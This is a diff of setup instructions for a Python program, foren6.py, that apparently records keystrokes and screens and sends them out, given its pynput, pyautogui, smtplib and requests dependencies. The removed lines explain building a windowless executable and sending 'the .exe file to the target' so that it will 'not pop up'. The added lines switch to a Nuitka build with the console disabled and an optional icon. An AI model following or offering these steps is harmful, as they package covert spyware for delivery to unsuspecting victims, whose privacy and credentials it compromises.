@@ -47,23 +47,9 @@ pip install pynput==1.6.8
 pip install smtplib
 pip install pyautogui
 pip install requests
-
+pip install -U nuitka
 ------convert to exe file---------------------------------------
-step 1:  download pyinstaller using the command
-pip install pyinstaller
--------------------------------------------
-step 2: Go into the directory where the foren6.py file is. 
------------------------------------------
-step 3: open the file in powershell
-----------------------------------------
-step 4: type this command
-pyinstaller --onefile -w --noconsole foren6.py
-enter
----------------------------------------
-open the dist file and there you go
----------------------------
-send the .exe file to the target.
-
+nuitka --mingw64 --windows-disable-console foren6.py
 --------------------------------------------------
-when you start the exucutable it will not pop up because 
-of the "--noconsole" command. 
+if you want a icon use the --icon=app.ico option in the cammand. 
+
